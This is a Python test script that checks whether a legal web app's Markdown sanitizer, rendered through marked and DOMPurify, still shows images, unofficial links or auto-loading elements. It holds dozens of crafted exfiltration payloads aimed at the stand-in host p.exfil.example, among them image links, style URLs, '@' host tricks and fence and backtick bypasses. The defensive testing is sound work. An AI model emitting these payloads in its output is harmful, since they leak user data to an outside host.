"""¿Pinta la web alguna imagen o algún enlace no oficial después del saneado (RNF-20)?

Pinta cada caso antes y después de ``sanear`` con el visor real de la web (marked +
DOMPurify, el ``renderMarkdown`` de ``legaldev-web/src/lib/markdown.ts``) y cuenta las
imágenes, los enlaces a destinos que no son los dominios oficiales del corpus y los demás
elementos que pueden cargar algo solos (con ``style``, ``background``, ``src``, ``srcset`` o
``poster``). Los casos son las cargas de PP-18 (``cargas.json``) y las formas que encontraron
las dos revisiones del saneado del 12/11/2026 (corchetes y paréntesis anidados, definiciones
de referencia en listas, URL detrás de cualquier carácter, vallas falsas, CRLF, acentos
graves sueltos, etiquetas con style, espacios Unicode en el destino, URL que siguen tras un
«'» o un acento grave, vallas que solo cierra marked y acentos que marked no empareja).
Completa a PP-18, cuyo oráculo (``tests/_pp18.py``) es una aproximación en Python a lo que
hace un visor. Los enlaces se juzgan por el host que resuelve el navegador (``new URL``), no
por el texto del href.

Solo lee: no carga la configuración ni el ``.env`` ni el índice, y de ``legaldev-web`` solo
usa sus ``node_modules`` (hace falta haber ejecutado ``npm ci`` allí). Necesita Node. Uso,
desde la raíz del repositorio:

    uv run python docs/mcp/pp18/visor_web.py <ruta de legaldev-web>

Sale con 1 si algún caso saneado pinta una imagen, un enlace no oficial o un elemento que
carga algo solo.
"""

from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

RAIZ = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(RAIZ))

from app.sanitize import DOMINIOS_OFICIALES, destino_oficial, sanear  # noqa: E402
from tests._pp18 import cargas  # noqa: E402

BS = "\\"
LT, GT = chr(60), chr(62)
NBSP = "\u00a0"
URL = "https://p.exfil.example/?d=DATOS"
ESTILO = 'style="background-image:url(//p.exfil.example/p.png?d=DATOS)"'
BOE_ACENTO = "https://www.boe.es/`"
# Segunda revisión del saneado (12/11/2026).
CASOS_SEGUNDA_REVISION = [
    f'{LT}spacer title="{LT}" {ESTILO}{GT}x{LT}/spacer{GT}',
    f"{LT}foo{GT}\n{LT}element/{ESTILO}{GT}x{LT}/element{GT}",
    f'| 5 | {LT}shadow title="{LT}" {ESTILO}{GT}x{LT}/shadow{GT} | 2 |',
    f'- elemento {LT}decorator title="{LT}" {ESTILO}{GT}x',
    f'{LT}content title="{LT}" {ESTILO}{GT}x{LT}/content{GT}',
    f'[BOE](https://www.boe.es{NBSP}"@p.exfil.example/?d=DATOS")',
    f"[BOE](https://www.boe.es{NBSP}'@p.exfil.example/?d=DATOS')",
    f"[BOE](https://www.boe.es{NBSP}(@p.exfil.example/?d=DATOS))",
    f'| art | fuente |\n|---|---|\n| 5 | [BOE](https://www.boe.es{NBSP}"@p.exfil.example/?d=DATOS") |',
    "Ver https://www.boe.es'@p.exfil.example/?d=DATOS",
    'Ver https://www.boe.es"@p.exfil.example/?d=DATOS',
    "Ver https://www.boe.es>@p.exfil.example/?d=DATOS",
    "Ver https://www.boe.es`@p.exfil.example/?d=DATOS",
    "Ver https://www.boe.es|@p.exfil.example/?d=DATOS",
    "Ver www.boe.es'@p.exfil.example/?d=DATOS",
    "| 1 | https://www.aepd.es'@p.exfil.example/?d=DATOS |",
    f"```\nx\n```~\n{URL}\n```",
    f"~~~\nx\n~~~`\n{URL}\n~~~",
    f"Texto.\n\n```\ncódigo\n```~~\n\nVisita {URL}\n\n```",
    f"{LT}{BOE_ACENTO}{GT} {URL} {LT}{BOE_ACENTO}{GT}",
    f"[a]({BOE_ACENTO}) {URL} [b]({BOE_ACENTO})",
    f"Ver {BOE_ACENTO} {URL} {BOE_ACENTO}",
    f"{LT}{BOE_ACENTO}{GT} www.p.exfil.example/?d=DATOS {LT}{BOE_ACENTO}{GT}",
    f"Ver {BS}``x` {URL} `y`",
    f"Ver `a\nb` {URL} `c`",
    f"| a | b | c |\n|---|---|---|\n| `x | {URL} | y` |",
    f"[a](https://www.boe.es/ '`') {URL} `",
    f"[a][x`] {URL} `\n\n[x`]: https://www.boe.es/",
    f"Ver {BS}{URL}",
    "Ver ftp://p.exfil.example/?d=DATOS",
    # Encontrados al comprobar los arreglos con texto aleatorio en este visor.
    f"{LT}https://www.boe.es/{GT}{URL}",
    f"[BOE](https://www.boe.es/){URL}",
    "Ver https://www.boe.es/(ftp://p.exfil.example/?d=DATOS",
    f"Ver {BS}`` {URL}",
    f"Ver {BS}`` x `{URL}`",
    f"*a https://www.boe.es/x*{URL}",
    f"[x https://www.boe.es/][r]{URL}\n\n[r]: https://www.boe.es/",
    "_a https://www.boe.es_www.p.exfil.example@evil.example/",
    f"x {LT}~ ftp://p.exfil.example/{BS}{GT}~{BS}!z",
    "Ver [1]: " + BS + "/" + BS + "/p.exfil.example/x y [2]: www.p.exfil.example",
]
CASOS_REVISION = [
    "![a [b [c]] d](//p.exfil.example/p.png?d=DATOS)",
    "[el art. [5 [RGPD]]](//p.exfil.example/?d=DATOS)",
    "[art. 5](//p.exfil.example/(a(b))?d=DATOS)",
    "[a [b [c]]](//p.exfil.example/x)(//p.exfil.example/y)(https://www.boe.es/z)",
    '[a [b [c]]](<//p.exfil.example/con espacio> "t")',
    "[a](" + BS + "/" + BS + "/p.exfil.example/x) y [b](&#47;&#47;p.exfil.example/x)",
    "- [r]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][r]",
    "[a" + BS + "]b]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][a" + BS + "]b]",
    "1.  uno\n\n    [r]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][r]",
    "[r\nx]: //p.exfil.example/?d=DATOS\n\nVer [art. 5][r x]",
    "* > 1) [r]: <//p.exfil.example/?d=DATOS>\n\nVer [art. 5][r]",
    "[r]: " + BS + "/" + BS + "/p.exfil.example/x\n\n[a][r]",
    f"Ver _{URL}_ y _www.p.exfil.example/?d=DATOS_",
    f"Ver x{URL} 1{URL} ñ{URL} /{URL} @{URL} ftp://www.p.exfil.example/x",
    f"```x`y\n{URL}",
    f"Texto.\r\n\r\n```\r\ncodigo\r\n```\r\nVisita {URL}\r\n",
    f"Ver `x {URL} y",
    f"Ver `{URL} y",
    f"Ver `x <{URL}> y",
]


def _pintar(web: Path, textos: list[str]) -> list[dict]:
    r = subprocess.run(
        ["node", str(Path(__file__).with_name("visor_web.mjs")), str(web)],
        input=json.dumps(textos),
        capture_output=True,
        text=True,
        encoding="utf-8",
        check=True,
    )
    return json.loads(r.stdout)


def _host_oficial(enlace: dict) -> bool:
    """¿Lleva el enlace, tal como lo resuelve el navegador, a un dominio oficial?"""
    host = enlace["host"] or ""
    return (
        enlace["protocolo"] in ("http:", "https:")
        and not enlace["usuario"]
        and any(host == d or host.endswith("." + d) for d in DOMINIOS_OFICIALES)
    )


def _peligros(pintado: dict) -> int:
    no_oficiales = [
        e
        for e in pintado["links"]
        if e["href"] and not (destino_oficial(e["href"]) and _host_oficial(e))
    ]
    return len(pintado["imgs"]) + len(no_oficiales) + len(pintado["cargas"])


def main() -> None:
    web = Path(sys.argv[1] if len(sys.argv) > 1 else "../legaldev-web").resolve()
    casos = [c["texto"] for c in cargas()] + CASOS_REVISION + CASOS_SEGUNDA_REVISION
    saneados = [sanear(t)[0] for t in casos]
    antes, despues = _pintar(web, casos), _pintar(web, saneados)
    peligrosos_antes = sum(1 for p in antes if _peligros(p))
    fallos = [t for t, p in zip(casos, despues, strict=True) if _peligros(p)]
    print(f"Visor: marked + DOMPurify de {web}")
    print(
        f"Casos: {len(casos)} ({len(cargas())} cargas de PP-18, {len(CASOS_REVISION)} de la "
        f"primera revisión y {len(CASOS_SEGUNDA_REVISION)} de la segunda)"
    )
    print(f"Con imagen, enlace no oficial o carga sin sanear: {peligrosos_antes}")
    print(f"Con imagen, enlace no oficial o carga después del saneado: {len(fallos)}")
    for t in fallos:
        print(f"  {t[:80]!r}")
    sys.exit(1 if fallos else 0)


if __name__ == "__main__":
    main()
